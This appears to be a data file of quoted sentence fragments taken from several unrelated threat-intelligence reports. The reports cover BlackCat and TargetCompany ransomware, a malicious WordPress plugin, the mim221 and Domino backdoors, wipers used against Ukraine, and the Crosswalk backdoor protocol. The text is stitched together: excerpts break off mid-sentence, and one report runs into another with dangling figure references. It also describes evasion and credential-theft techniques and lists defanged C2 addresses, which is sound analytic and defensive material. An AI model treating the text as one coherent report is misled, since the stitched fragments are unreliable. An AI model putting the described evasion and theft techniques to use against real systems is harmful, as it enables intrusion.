            "Written in the Russian language, the control panel gives the affiliate updates and announcements about deploying and operating the ransomware as well as troubleshooting tips to help the affiliate be more successful in their campaigns.",
            "Along with the control panel, a name and shame blog is also hosted, targeting victims who have either ignored or refused to pay the ransom.",
            "This site has been regularly updated with new victims since the initial discovery of the group. ",
            "As shown in Figure 1 below, many RaaS operators use the double-extortion technique of exfiltrating data prior to encryption, which provides them greater leverage in negotiating ransom funds.",
            "As of December 2021, BlackCat has the seventh largest number of victims listed on their leak site among ransomware groups tracked by Unit 42 \u2013 impressive considering that this group has only been publicly known since November 2021.",
            "While Conti (ranked second) has been around in various guises for almost two years, it is surrounded at the top of the chart by emerging families.",
            "LockBit 2.0 and Hive both have at least six months\u2019 head start on BlackCat, but this highlights a worrying trend that newcomers (or reformed groups) can attack many victims in a short space of time. Figure 1.",
            "Leak site/name and shame blog statistics, December 2021.Using the leak site information, we can understand the location and types of victims affected by BlackCat attacks.",

            "Figure 2 breaks down the victims by country.",
            "However, the so-far sporadic spread of the attacks may indicate a somewhat opportunistic approach, as with most contemporary ransomware families. ",
            "Figure 2.",
            "BlackCat leak site victims by country.",
            "Technical Details BlackCat is positioned to pivot to individualized, customized attacks due to the numerous options available when coding in Rust (Figure 3).",
            "Rust programming has gained momentum due to its fast and high performance, powerful web application development, low overhead for embedded programming, and memory management resolution.",
            "Rust also facilitates the BlackCat author due to its efficiency regarding algorithms that power the encryption capability of the ransomware.",
            "Because of its efficiency and adaptability, BlackCat has been seen targeting both Windows and Linux systems. ",

            "BlackCat execution options.",
            "In an effort to maintain longevity, the use of the --access-token flag is required to execute the ransomware, which can make it harder to analyze in sandboxed environments. ",
            "BlackCat Config While analyzing the ransomware configurations, we observed numerous evasion tactics deployed.",
            "These evasion techniques are used in an effort to impair or disable system defenses as well as to stop certain applications that may lock files open on disk, causing problems when trying to encrypt them.",

            "These observations have also been confirmed by Symantec. ",
            "Associated Tools BlackCat has been observed using multiple \u2013 often legitimate \u2013 tools throughout their attacks, such as Mimikatz, LaZagne and WebBrowserPassView to recover stored passwords, as well as GO Simple Tunnel (GOST) and MEGAsync to exfiltrate data.",
            "Additionally, anti-forensics tools like fileshredder, an application to securely delete unwanted files beyond recovery, have also been leveraged during some BlackCat ransomware attacks investigated by Unit 42. ",
            "Post-compromise Activities Once candidate systems have been identified for encryption by the threat actors, the ransomware deployment occurs and all viable files will be encrypted.",
            "This process often involves renaming files to include another or a different file extension, such as wpzlbji, in the example shown in Figure 4.",
            "As is commonplace with other ransomware strains, BlackCat ransomware will drop ransom notes on the compromised system(s) to inform the victim of what has happened and how to go about getting their data restored.",

            "Interestingly, the ransom demand gives the victim the option to pay not only in Bitcoin (the most common option) but also in Monero. ",
            "In some cases, BlackCat operators use the chat to threaten the victim, claiming they will perform a DDoS attack on the victims' infrastructure if the ransom is not paid.",
            "When it appears in addition to the use of a leak site, this practice is known as triple extortion, a tactic that was observed being used by groups like Avaddon and Suncrypt in the past. ",

            "The technical details of this vulnerability can be found on their recent blog post.",
            "Over one million websites use this plugin and the fallout from this has been absolutely massive, with over 6,000 detections by SiteCheck already so far and 1637 detections in",

            "Contents:New malware taste, classic Balada flavorAs with any new vulnerability like this the attackers associated with the years-long Balada malware campaign (which we have documented extensively on this blog) were quick to jump on the opportunity.",
            "Within 24 hours of the vulnerability\u2019s release we observed a large spike in infections, many of which included a Doppelg\u00e4nger post-layouts (Post Layouts for Gutenberg) plugin.",
            "Notice the added \u201cs\u201d in posts:./wp-content/plugins/posts-layoutsSince the vulnerability allows for unauthenticated takeover of websites, attackers are able to take full administrator control of victim environments and install malicious plugins like the one above.",
            "Post Layouts is actually a legitimate plugin found within the WordPress repository with over 30,000+ installations and is designed to add functionality to WordPress that allows posts to be displayed in grid and list layouts.",
            "That being said, the version installed by the Balada attackers is spurious and a maliciously modified version, in which hackers disabled the legitimate functionality and added malicious code to be executed instead.",
            "All legitimate files and the metadata of the real post-layouts plugin are retained though, which make it look like the real deal at the first sight.",
            "We can see that with 30,000+ active installations, the original plugin has only less than 11,000 all time downloads.",
            "Usually, the number of all time downloads is significantly higher than the number of active installations, since it\u2019s common practice to download plugins, test them, and remove/disable afterwards.",
            "At the beginning of this week, the number of active installations was still 20,000+.",
            "With 316 downloads during the last 7 days, you can hardly expect the number of active installations to increase so quickly.",

",
            "The earliest samples of the TargetCompany ransomware appended victims\u2019 files with the extension \u201c.tohnichi,\u201d the name of its victim enterprise at that time, signifying a targeted attack on the organization of the same name.",
            "As a result, it was initially known as the Tohnichi ransomware. ",
            "Later, the group continued appending encrypted files with names based on its victims, such as \u201c.artis\u201d for the Artis Zoo in Amsterdam.",
            "Other extensions include \u201c.herrco,\u201d \u201c.brg,\u201d and \u201c.carone.\u201d Industry experts then later identified the ransomware as TargetCompany from the pattern it adopted of appending encrypted files after the company it was targeting. ",
            "The variants Tohnichi (active in 2021), Mallox, and Fargo (both active in 2022) targeted vulnerabilities in Microsoft SQL (MS SQL) Server for initial access.",

            "Simultaneously active: Xollam and Mallox variants ",
            "In 2023, Xollam was observed as following a technique similar to the one followed by phishing campaigns: using Microsoft OneNote files as initial access to spread and deliver malware.",
            "This latest TargetCompany variant executed a spam campaign with malicious OneNote file attachments, a deviation from its roots of targeting vulnerable MS SQL databases. ",
            "Based on our investigations, Xollam uses a pseudo-fileless technique through PowerShell, which executes reflective loading to download its payload. ",
            "As we discuss in later sections, we have also observed this technique in earlier variants of the TargetCompany ransomware. ",
            "Figure 2.",
            "The attack flow of the latest TargetCompany variant, Xollam, which uses malicious OneNote files for initial access The latest variant of the ransomware, Xollam, was detected in February this year. ",
            "In the same month, the older Mallox variant was also active, as it claimed the attack on the Federation of Indian Chambers of Commerce and Industry (FICCI).",
            "The gang released 1.28 GB of compressed datasets that included financial balance sheets, employee reimbursement details, bank statements and internet banking credentials, industry audit reports, and documents related to FICCI subcommittees. ",
            "Reflective loading, Mallox, and Fargo variants ",
            "The Mallox variant of the ransomware was first detected in the wild in October 2021.",
            "Later samples in January of the following year showed that the ransomware group started to employ reflective loading as part of its defense evasion. ",
            "The Mallox variant connects to an IP address to load the encrypted ransomware, with its download URL only available for approximately 24 hours.",
            "Notably, this made the dynamic analysis of old samples difficult. ",
            "Our investigations revealed that the payload downloaded by the PowerShell script was a .NET downloader, which would subsequently retrieve an encrypted payload from the command-and-control (C&C) server. ",
            "The downloaded file has a random file name and might have different extensions such as \u201c.png,\u201d \u201c.bmp,\u201d and \u201c.jpg,\u201d among others. ",
            "Figure 3.",
            "A closer look at the reflective loading technique that TargetCompany threat actors incorporated; the IP address it connects to changes every 24 hours and deploys different payloads The payload would then be decrypted through XOR or inversion and executed in memory.",

            "Figure 4.",
            "Both Mallox and Fargo variants use a set of tools via remote desktop for defense evasion. ",
            "It\u2019s important to note that reflective loading enabled the Mallox variant to evade traditional antivirus solutions, making it challenging for organizations to protect themselves against these attacks. ",
            "Meanwhile, the Remcos backdoor payload is executed via WmiPrvSE.exe, and the payload most likely arrives by exploiting public-facing websites and domains. ",
            "Our investigations showed that the gang used different sets of defense evasion and reconnaissance tools such as GMER and Advance Process Termination to manually uninstall antivirus products on the target system.",
            "We also observed the presence of YDArk.exe (PCHunter64) for performing rootkit behaviors, and that TargetCompany attempts to terminate security-related processes and services by dropping KILLAV. ",
            "In addition, the ransomware drops a batch file named killer.bat that terminates various services and applications, including GPS-related services.",
            "Afterward, it proceeds to steal system information like machine details and other relevant data. ",
            "Figure 5.",
            "TargetCompany ransomware defense evasion routine ",
            "The ransomware encrypts the victim's files using the ChaCha20 encryption algorithm and generates the encryption keys using a combination of Curve25519, an example of elliptic curve cryptography, and AES-128. ",
            "In June 2022, the gang targeted other victims with encrypted files appended with the extension \u201c.fargo.\u201d",
            "We also observed that like Mallox, the Fargo variant employed reflective loading. ",
            "In the last two months of 2022, there was an increase in attacks launched by the TargetCompany ransomware using its Mallox variant. ",
            "Extortion While the Mallox and Fargo variants were operating simultaneously in 2022, TargetCompany initiated its double-extortion scheme by setting up a Telegram channel where it could publish stolen information. ",
            "In August 2022, just two months after the group launched its Fargo variant, Mallox created a Twitter account where it could announce its victims.",
            "Since this account was eventually suspended, the threat actors created a new one. Figure 6.",
            "The first Twitter account (eventually suspended) that Mallox created for announcing its victims (top), and the new Twitter account that replaced it (bottom); the new account remains active as of this writing In November of the same year, Mallox launched its data leak site where, as of writing, it has declared only 20 victims.",
            "However, our telemetry data revealed far more attacks at 269 attempts on Trend Micro customers from March 2022 to April 2023. ",
            "In a January 2023 interview, threat actors behind TargetCompany said that they choose only a small percentage of their victims to publish on their leak site.",
            "They also limit the amount of leaked data to what they deem particularly interesting and claim to have no intention of publishing everything. ",
            "While the group said that it remains small and closed, the actors behind it mentioned that they are \u201copen to suggestions.\u201d",
            "Interestingly, a new member of the cybercrime forum RAMP under the name \u201cMallx\u201d was observed recruiting affiliates for the Mallox ransomware-as-a-service (RaaS) affiliate program. ",
            "Our investigations also revealed that the ransomware might have connections with other groups such as the BlueSky ransomware, as well as the threat actors who perform brute-force attacks on MS SQL Servers.",
            "TargetCompany shares similarities with these groups in terms of threat actor profiles, targets, deployed remote control, and encryption algorithm.",
            "We discuss other possible affiliations, as well as victim profiles and behaviors in our Spotlight feature on the ransomware group. ",
            "Conclusion The TargetCompany ransomware is making bolder ventures beyond its tried-and-tested techniques by joining the bandwagon of OneNote phishing campaigns, which allows it to cast a wider net for increased profitability.",
            "Within just two years of activity, the threat actors behind the ransomware are proving their hunger for prolificacy, expanding their business model with a RaaS affiliate program and maintaining several platforms to announce victims and expose stolen data. ",
            "We can expect TargetCompany to make even bigger moves in the future, especially since the threat actors behind it have admitted that they created TargetCompany to move away from the restrictions and inflexibility of their previous groups.",
            "Now unhindered, the gang will naturally try to maximize profits from its victims. ",
            "To protect systems from ransomware attacks, we recommend that both individual users and organizations implement best practices such as applying data protection and backup and recovery measures to secure data from possible encryption or erasure.",
            "Conducting regular vulnerability assessments and patching systems in a timely manner can also minimize the damage dealt by ransomware families that abuse exploits. ",
            "We advise users and organizations to update their systems with the latest patches and apply multilayered defense mechanisms.",
            "End users and enterprises alike can mitigate the risk of infection from new threats like the TargetCompany ransomware by following these security best practices: Enable multifactor authentication (MFA) to prevent attackers from performing lateral movement inside a network. ",
            "Adhere to the 3-2-1 rule when backing up important files.",
            "This involves creating three backup copies on two different file formats, with one of the copies stored in a separate location. ",
            "Patch and update systems regularly.",
            "It\u2019s important to keep operating systems and applications up to date and maintain patch management protocols that can deter malicious actors from exploiting any software vulnerabilities. ",

",
            "We assess that this activity represents an evolution of tooling associated with Operation Soft Cell. ",

            "We assess it is highly likely that these attacks were conducted by a Chinese cyberespionage actor related to the Operation Soft Cell campaign. ",

            "Once a foothold is established, the attackers conduct a variety of reconnaissance, credential theft, lateral movement, and data exfiltration activities. ",
            "The deployment of custom credential theft malware is central to this new campaign.",
            "The malware implemented a series of Mimikatz modifications on closed-source tooling.",
            "This post details the multi-component architecture and functionality of a sample, referred to as mim221. ",
            "We assess that mim221 is a recent version of an actively maintained credential theft capability upgraded with new anti-detection features.",
            "The use of special-purpose modules that implement a range of advanced techniques shows the threat actors\u2019 dedication to advancing its toolset towards maximum stealth.",
            "These techniques include in-memory mapping of malicious images to evade EDR API hooks and file-based detections surgically terminating Event Log threads instead of the host process to inhibit logging without raising suspicions staging a credential theft capability in the LSASS process itself by abusing native Windows capabilities. ",
            "Version numbers and build timestamps indicate a maintained software project by designated developers.",
            "Closer analysis reveals an element of pragmatism in that the threat actors use modified publicly available code to achieve their goals. ",
            "In terms of attribution, the tooling suggests an immediate link to the \u2018Operation Soft Cell\u2019 campaign but remains slightly vague on the specific threat actor.",
            "That campaign has been publicly associated with Gallium and possible connections to APT41 have been suggested by the use of a common code signing certificate and tooling that shares code similarities.",
            "APT41 is also known to target telecommunication providers. ",
            "Given previous target and TTP overlaps, and an evident familiarity with victim environments, we assess with medium-confidence that Gallium is involved.",
            "However, we also recognize the possibility of closed-source tool-sharing between Chinese state-sponsored threat actors, and the possibility of a shared vendor or digital quartermaster. ",
            "Regardless of clustering specifics, this finding highlights the increased operational tempo of Chinese cyberespionage actors and their consistent investment in advancing their malware arsenal to evade detection. ",
            "Infection Vector and Initial TTPs As initial attack indicators, we observed command execution through webshells on compromised Microsoft Exchange server deployments.",

            "Domino\u2019s code shows overlap with the Lizar (aka Tirion, Diceloader) malware family, leading us to suspect that it was created by current or former ITG14 developers. ",
            "One of Domino\u2019s final payloads is the Project Nemesis infostealer.",
            "Project Nemesis was first advertised on the dark web in December 2021, though has been rarely used since then. ",
            "Analysis Ex-Conti Members Deploy Domino in Recent Campaigns Former members of ITG23 (aka the Trickbot/Conti syndicate) are likely behind recent campaigns using the Dave Loader to load Domino Backdoor and probably collaborated with current or former ITG14 developers to purchase or use the new malware family.",
            "X-Force previously assessed that Dave is one of several loaders or crypters developed by members of the Trickbot/Conti group.",
            "Although the group has fractured, many of its loaders/crypters \u2014 including Dave \u2014 have been maintained and continue to be used by factions composed of former Trickbot/Conti members, including Quantum, Royal, BlackBasta, and Zeon. ",
            "The Dave Loader has been used recently with several Cobalt Strike samples with the watermark \u201c206546002,\u201d which X-Force and other security researchers \u2014 here and here \u2014 have associated with groups composed of former members of the Trickbot/Conti syndicate, including Quantum and Royal.",
            "X-Force observed Dave-loaded Cobalt Strike samples using this watermark in suspected Royal attacks in fall 2022. ",
            "Dave Loader has also been used this year to load IcedID and Emotet, both of which serve as initial access vectors for ransomware attacks from former Trickbot/Conti-affiliated factions. ",
            "Recently observed Dave samples were discovered loading a new malware, which we have named Domino Backdoor.",
            "This new backdoor gathers basic system information, which it then sends to the C2, and in return receives an AES encrypted payload. ",
            "In most instances, the received payload was a second loader that was found to have code overlap with Domino Backdoor, and as such we have dubbed it Domino Loader.",
            "This loader contains an encrypted payload within its resources, which it decrypts using AES.",
            "The decrypted payload is a .NET infostealer, which identifies itself as \u2018Nemesis Project.\u2019 ",
            "The Domino Backdoor is designed to contact a different C2 address for domain-joined systems, suggesting a more capable backdoor, such as Cobalt Strike, will be downloaded on higher value targets instead of Project Nemesis. ",
            "Domino\u2019s Connections to ITG14 Analysis revealed that both the Domino Backdoor and Loader share code overlap with the Lizar Malware, also known as Tirion and DiceLoader, which is attributed to the threat group ITG14 (FIN7).",
            "In addition to having similar coding styles and functionality, both Domino and DiceLoader share the same configuration structure and have similar bot ID formats.",
            "Lizar was reportedly first used in March 2020, when it was originally named Tirion, and has been observed in numerous ITG14 campaigns up to the end of 2022.",
            "Domino has been active in the wild since at least October 2022, which notably is when Lizar observations began to decrease. ",
            "X-Force researchers found additional evidence connecting Domino Backdoor to ITG14\u2019s Carbanak Backdoor.",
            "We identified Domino Backdoor samples from December 2022, which used a different loader that we have dubbed NewWorldOrder Loader.",
            "The samples used the name ThunderboltService.exe and downloaded and loaded the Project Nemesis Stealer. ",
            "Around the same time, we also uncovered NewWorldOrder Loader samples, with the same filename ThunderboltService.exe, used to load the Carbanak Backdoor.",
            "Carbanak has been used by ITG14 since late 2015. ",
            "Finally, X-Force analysts also observed that two of the Domino Backdoor C2 addresses belonging to MivoCloud: 94.158.247[.]72 and 185.225.17[.]202 are very close to C2 addresses ITG14 has used previously for SSH-based Backdoors such as 94.158.247[.]23 and 185.225.17[.]220.",
            "While such overlap is insufficient for attribution, it is nonetheless consistent with other evidence linking Domino to an ITG14 developer and may indicate the latter\u2019s preference for MivoCloud for at least some of their C2 addresses.",
            "MivoCloud has also been used to host Diceloader and Carbanak C2 servers. ",

            "Other researchers \u2014 here and here \u2014 observed ITG14 attacks using Ryuk ransomware in 2020, which has been attributed to the Trickbot/Conti cybercrime syndicate, while others have also identified connections between a FIN7 developer and tools used by the BlackBasta group, whose members also have ties to the former Trickbot/Conti syndicate. ",
            "Project Nemesis The Project Nemesis infostealer has been active in the wild since December 2021, when it was offered for sale on several Dark Web forums.",
            "It can collect data from a range of web browsers, as well as applications including Steam, Telegram, Discord, crypto wallets, and VPN providers. ",
            "Domino has been used to install Project Nemesis since at least October 2022 \u2014 prior to its use in late February 2023 by ex-Conti actors.",
            "This leads us to assess that the ITG14 members responsible for developing Domino probably had a relationship with Project Nemesis and offered Domino and the infostealer to the ex-Conti threat actors as a package.",
            "The ex-Conti members in turn likely used the Project Nemesis infostealer against lower value targets. ",
            "The use of infostealers by former Trickbot/Conti members and their distributors is not without precedent \u2014 other security researchers observed the Vidar infostealer delivered during DEV-0569 Batloader campaigns that also led in some cases to Cobalt Strike and Royal ransomware.",
            "We assess that infostealers may often be deployed during lower priority infections, e.g., on personal computers or those not belonging to an Active Directory domain, while higher priority infections receive other backdoors such as Cobalt Strike. ",

",
            "This blog post looks to explain how wipers work, what makes them so effective and provides a short overview of the most recent samples that appeared in the eastern Europe geopolitical conflict. ",
            "How does wiper malware work? ",
            "Wiper\u2019s main objective is to destroy data from any storage device and make the information unavailable (T1485).",
            "There are two ways of removing files, logical and physical. ",
            "Logical file removal is the most common way of erasing a file, performed by users daily when a file is sent to (and emptied from) the Recycle bin, or when it is removed with the command line or terminal with the commands del/rm.",
            "This action deletes the pointer to the file but not the file data, making it recoverable with forensic tools as long as the Operative System does not write any other file in the same physical location. ",
            "However, malware wipers aim to make the data irrecoverable, so they tend to remove the data from the physical level of the disk.",
            "The most effective way to remove the data/file is by overwriting the specific physical location with other data (usually a repeated byte like 0xFF).",
            "This process usually involves writing to disk several Gigabytes (or Terabytes) of data and can be time consuming.",
            "For this reason, in addition to destroying the data, many wipers first destroy two special files in the system: The Master Boot Record (MBR), which is used during the boot process to identify where the Operative System is stored in the disk.",
            "By replacing the MBR, the boot process crashes, making the files inaccessible unless forensic methodologies are used. ",
            "The Master File Table (MFT) is exclusive to NTFS file systems, contains the physical location of files in the drive as well as logical and physical size and any associated metadata.",
            "If big files need to be stored in the drive, and cannot use consecutive blocks, these files will have to be fragmented in the disk.",
            "The MFT holds the information of where each fragment is stored.",
            "Removing the MFT will require the use of forensic tools to recover small files, and basically prevents recovery of fragmented files since the link between fragments is lost. ",
            "The main difference between wipers and ransomware is that it\u2019s impossible to retrieve the impacted information after a wiper attack.",
            "Attackers using wipers do not usually target financial reward but intend to disrupt the victim\u2019s operations as much as possible.",
            "Ransomware operators aim to get a payment in exchange for the key to decrypt the user\u2019s data. ",
            "With both wiper and ransomware attacks, the victim depends on their back up system to recover after an attack.",
            "However, even some wiper attacks carry ransom notes requesting a payment to recover the data.",
            "It is important that the victim properly identifies the attack they've suffered, or they may pay the ransom without any chance of retrieving the lost data. ",
            "In the last month and a half, since the war started in Eastern Europe, several wipers have been used in parallel with DDoS attacks (T1499) to keep financial institutions and government organizations, mainly Ukrainian, inaccessible for extended periods of time.",
            "Some of the wipers observed in this timeframe have been: WhisperKill, HermeticWiper, IsaacWiper, CaddyWiper, DoubleZero Wiper and AcidRain. ",
            "Most recent wiper examples WhisperKill On January 14, 2022, the Ukrainian government experienced a coordinated attack on 22 of their government agencies, defacing their websites.",
            "Almost all the compromised websites were developed by the same Ukranian IT company, Kitsoft, and all of them were built on OctoberCMS.",
            "Therefore, the attack vector was most probably a supply chain attack on the IT provider, or an exploitation of an OctoberCMS vulnerability, combined with exploitations of Log4Shell vulnerability (T1190). ",
            "Figure 1.",
            "Example of defaced Ukrainian government website. ",
            "In addition to the website defacement, Microsoft Threat Intelligence Center (MSTIC), identified in a report destructive malware samples targeting Ukrainian organizations with two malware samples.",
            "Microsoft named the samples WhisperGate, while other security companies labeled the downloader as WhisperGate and WhisperKill as the actual wiper, which was considered a component of WhisperGate. ",
            "The identified files were: Stage1 replaces the Master Boot Record (MBR) with a ransom note when the system is powered down, deeming the machine unbootable after that point.",
            "When booted up, the system displays Figure 2 on screen.",
            "Despite the ransom request, the data will not be recoverable since all efforts made by WhisperKill are looking to destroy data, not encrypt it.",
            "In this case, the wallet is most probably an attempt to decoy attribution efforts. ",
            "Figure 2.",
            "Ransom note obtained by MSTIC. ",
            "Stage 2 attempts to download the next stage malware (T1102.003) from the Discord app, if unsuccessful, it sleeps and tries again.",
            "The payload downloaded from the messaging app destroys as much data as possible by overwriting certain file types with 0xCC for the first MB of the file.",
            "Then it modifies the file extension to a random four-byte extension.",
            "By selecting the file types to be wiped and only writing over the first MB of data, the attackers are optimizing the wiping process.",
            "This is due to not wasting time on system files and only spending the necessary time to wipe each file, rapidly switching to the next file as soon as the current one is unrecoverable.",
            "Finally, the malware executes a command to delete itself from the system (T1070.004). ",
            "HermeticWiper A month after, on February 23rd 2022, ESET Research reported a new Wiper being used against hundreds of Ukrainian systems.",
            "The wiper receives its name from the stolen certificate (T1588.003) it was using to bypass security controls \u201cHermetica Digital Ltd\u201d (T1588.003).",
            "According to a Reuters article, the certificate could have also been obtained by impersonating the company and requesting a certificate from scratch. ",
            "Figure 3.",
            "Hermetica Digital Ltd certificate. ",
            "The attackers have been seen using several methods to distribute the wiper through the domain, like: domain Group Policy Object (GPO) (T1484.001), Impacket or SMB (T1021.002) and WMI (T1047) with an additional worm component named HermeticWizard. ",
            "The wiper component first installs the payload as a service (T1569.002) under C:\\Windows\\system32\\Drivers\\. Afterwards, the service corrupts the first 512 bytes of the MBR of all the Physical Drives, and then enumerates their partitions.",
            "Before attempting to overwrite as much data as the wiper can it will delete key files in the partition, like MFT, $Bitmap, $LogFile, the NTUSER registry hive (T1112) and the event logs (T1070.001). ",
            "On top of deleting key file system structures, it also performs a drive fragmentation (breaking up files and segregating them in the drive to optimize the system\u2019s performance).",
            "The combination of the file fragmentation and the deletion of the MFT makes file recovery difficult, since files will be scattered through the drive in small parts - without any guidance as to where each part is located. ",
            "Finally, the malware writes randomized contents into all occupied sectors in the partition in an attempt to remove all potential hope of recovering any data with forensic tools or procedures. ",
            "IsaacWiper A day after the initial destructive attack with HermeticWiper, on February 24th, 2022, a new wiper was used against the Ukrainian government, as reported by ESET, without any significant similarities to the HermaticWiper used the day before. ",
            "IsaacWiper identifies all the physical drives not containing the Operative System and locks their logical partitions by only allowing a single thread to access each of them.",
            "Then it starts to write random data into the drives in chunks of 64 KB.",
            "There is a unique thread per volume, making the wiping process very long. ",
            "Once the rest of the physical drives and the logical partitions sharing physical drive with the Operative System\u2019s volume have been wiped, this last volume is wiped by: Erasing the MBR. ",
            "Overwriting all files with 64 KB chunks of random data with one thread. ",
            "Creating a new file under the C drive which will be filled with random data until it takes the maximum space it can from the partition, overwriting the already overwritten existing files.",
            "This process is performed with a different thread, but it would still take a long time to write the full partition since both concurrent threads are actually attempting to write random data on the full disk. Figure 4.",
            "IsaacWiper strings. ",
            "When comparing IsaacWiper to WhisperKill, the attackers\u2019 priorities become clear.",
            "WhisperKill creators prioritized speed and number of affected files over ensuring the full drive is overwritten, since only 1 MB of each file was overwritten.",
            "On the other hand, IsaacWiper creators gave total priority to deliver the most effective wiper, no matter how long it takes to overwrite the full physical disk. ",
            "AcidRain On the same day IsaacWiper was deployed, another wiper attacked Viasat KA-SAT modems in Ukraine, this time with a different wiper, named AcidRain by SentinelLABS.",
            "This wiper was particularly aimed at modems, probably to disrupt Internet access from Ukraine.",
            "This new wiper showed similarities to previously seen botnets targeting modems using VPNFilter.",
            "It was used in 2018, targeting vulnerabilities in several common router brands:",
            "Linksys, MikroTik, NETGEAR, and TP-Link.",
            "Exploiting vulnerabilities allowed the attackers to obtain Initial Access inside all types of networks, where the bot would search for Modbus traffic to identify infected systems with Industrial Control Systems (ICS). ",
            "The wiper used was the ELF MIPS wiper targeting Viasat KA-SAT modems, which aimed to firstly overwrite any file outside of the any common *nix installation: bin, boot, dev, lib, proc, sbin, sys, sur, etc. to then delete data from /dev/. CaddyWiper The first version of CaddyWiper was discovered by ESET researchers on 2022-03-14 when it was used against a Ukrainian bank.",
            "This new wiper variant does not have any significant code similarities to previous wipers.",
            "This sample specifically sets an exclusion to avoid infecting Domain Controllers in the infected system.",
            "Afterwards, it targets C:/Users and any additional attached drive all the way to letter Z:/ and zeroes all the files present in such folders/drives.",
            "Finally, the extended information of the physical drives is destroyed, including the MBR and partition entries. ",
            "A variant of CaddyWiper was used again on 2022-04-08 14:58 against high-voltage electrical substations in Ukraine.",
            "This latest version of the wiper was delivered together with Industroyer2, an evolution of Industroyer, which has the main functionn being to communicate with industrial equipment.",
            "In this case, the wiper was used with the purpose of slowing down the recovery process from the Industroyer2 attack and gaining back control of the ICS consoles, as well as covering the tracks of the attack.",
            "According to Welivesecurity, who have been cooperating with CERT-UA in this investigation, the Sandworm Team is behind this latest attack. ",
            "In this same attack against the energy station in Ukraine, other wiper samples for Linux and Solaris were observed by WeliveSecurity.",
            "These wipers leverage the shred command if present, otherwise they use the basic dd or rm commands to wipe the system. ",
            "DoubleZero wiper On March 22, 2022 CERT-UA reported a new wiper used against their infrastructure and enterprises.",
            "Named DoubleZero, the wiper was distributed as a ZIP file containing an obfuscated .NET program.",
            "The wiper\u2019s routine sets a hardcoded list of system directories, which are skipped during an initial wiping targeting user files.",
            "Afterwards, the skipped system directories are targeted and finally the registry hives: HKEY_LOCAL_MACHINE (containing the hives Sam, Security, Software and System), HKEY_CURRENT_USER and HKEY_USERS. ",
            "There are two wiping methods, both of which zero out the selected file. ",
            "Figure 5.",
            "DoubleZero first wiping function. ",
            "Conclusion As we have seen in the examples above, the main objective of the attackers behind wipers is to destroy all possible data and render systems unbootable (if possible), potentially requiring a full system restore if backups aren\u2019t available.",
            "These malware attacks can be as disruptive as ransomware attacks, but wipers are arguably worse since there is no potential escape door of a payment to recover the data. ",
            "There are plenty of ways to wipe systems.",
            "We've looked at 6 different wiper samples observed targeting Ukranian entities. ",
            "These samples approach the attack in very different ways, and most of them occur faster than the time required to respond.",
            "For that reason, it is not effective to employ detection of wiper malware, as once they are in the system as it is already too late.",
            "The best approach against wipers is to prevent attacks by keeping systems up to date and by increasing cybersecurity awareness.",
            "In addition, consequences can be ameliorated by having periodic backup copies of key infrastructure available. ",
            "Associated indicators (IOCs) ",

            "Crosswalk has broad capabilities for connecting to C2 servers.",
            "The network configuration for this particular sample is at the end of the shellcode and is XOR encrypted with a 16-byte key.",

            "Key (16 bytes) Encrypted configuration The configuration, in turn, contains the following fields: 0x0 heartbeat interval (in seconds) 0x4 reconnect interval (in seconds) 0x8 bitmask for days of the week when connections may be made 0xC (inclusive) lower bound for time of day when connections may be made 0x10 (non-inclusive) upper bound for time of day when connections may be made 0x14 proxy port 0x18",

            "Then, one after the other, it tries combinations of possible proxy servers (any indicated in the configuration plus system proxies) and C2 servers until it connects successfully. ",
            "The communication protocol used between the backdoor and C2 server can be separated logically into two levels: Application-level protocol Transport-level protocol On the application level, messages consist of the following fields: FakeTLS header consisting of 5 bytes: Entry type and protocol version (3 bytes).",

            "Data length, not including header (2 bytes) Message contents: Command ID (4 bytes, little-endian) Command data size (4 bytes, little-endian) Client ID (36 bytes), generated based on the UUID when the backdoor starts operation Command data The first two client\u2013server and server\u2013client messages have command IDs 0x65 and 0x64, respectively.",
            "They contain the data that will then be used to generate the client and server session keys.",
            "The key generation algorithm is detailed in a Zscaler report.",
            "For all subsequent messages, the content (not including the FakeTLS header) is transferred in the corresponding encrypted session key. AES-128 is the encryption algorithm used. ",

            "Four protocols are supported: Standard TCP connection Application-level messages are sent unchanged as TCP segments. ",
            "Equivalent to HTTP Long Polling The client creates two TCP connections.",
            "The first will be used to get packets from the server, and the second to send them. ",
            "During the first connection, a GET request is sent to the C2 server.",
            "The server replies with headers with code 200 and Content-Length: 524288000.",
            "The subsequent stream of application-level messages from the server to the client is sent as the body of an HTTP response. ",

            "The first packet always has length 0.",
            "The second has length 0x3A, 0x3C, 0x3E, or 0x40 and contains random bytes.",

            "Additional packets with FakeTLS header KCP protocol This protocol can be implemented on top of any other protocol (including UDP) to ensure quick and reliable data transfer.",
            "The Crosswalk client uses KCP on top of a TCP connection: KCP protocol data is added to application-level messages that are then sent as TCP segments. ",
            "Figure 13.",
            "Crosswalk message with KCP headers (highlighted in yellow) Note that in the Crosswalk samples we detected, none of the samples used the KCP protocol in practice.",
            "But the code contains a full-fledged implementation of this protocol, which could be used in other attacks: the developers would simply need to set this connection type in the configuration. ",
            "The diversity of protocols and techniques would seem to protect the backdoor from network traffic inspection. ",
            "2. Loaders and injectors Investigation of network infrastructure and monitoring of new Crosswalk samples put us onto the scent of other malicious objects containing Crosswalk shellcode as their payload.",
            "We can categorize these objects into two groups: local shellcode loaders and injectors.",
            "Some of the samples in both groups are also obfuscated with VMProtect. ",
            "2.1 Injectors Figure 14.",
            "Code for injecting shellcode into a running processThe injectors contain typical code that obtains SeDebugPrivilege, finds the PID of the target process, and injects shellcode into it.",

            "The samples we found contain one of three payloads: Crosswalk Metasploit stager FunnySwitch (discussed later in this report) Crosswalk and FunnySwitch shellcode is located in the data sections \"as-is,\" while the samples with Metasploit show additional XOR encryption with the key \"jj1\". ",
            "2.2 Local shellcode loaders The main function of the malware is to extract shellcode and run it in an active process.",
            "The malware samples belong to one of two categories, based on the source of shellcode that they use: in the original executable or in an external file in the same directory. ",
            "Most of the loaders start by checking the current year, much like the samples from the LNK file attacks. ",
            "Figure 15.",

            "In the following diagram we conducted a high-level comparison of the tools being used by the adversary: Figure 9 Tools comparison Although some of the tools are unique to each campaign, if taken into consideration over time with when they were used, it makes sense.",
            "It demonstrates the development of the actor and use of newer tools to conduct lateral movement and to obtain the required level of user rights on systems. ",
            "Overall, we observed the same modus operandi.",
            "Once an initial foothold was established, the adversary would deploy PlugX initially to create a few backdoors in the victim\u2019s network in case they were discovered early on.",
            "After that, using Mimikatz and dumping lsass, they were looking to get valid accounts.",

            "From there, several shares/servers were accessed, and information gathered.",
            "That information was exfiltrated as rar files and placed on an internet-facing server to hide in the \u2018normal\u2019 traffic.",
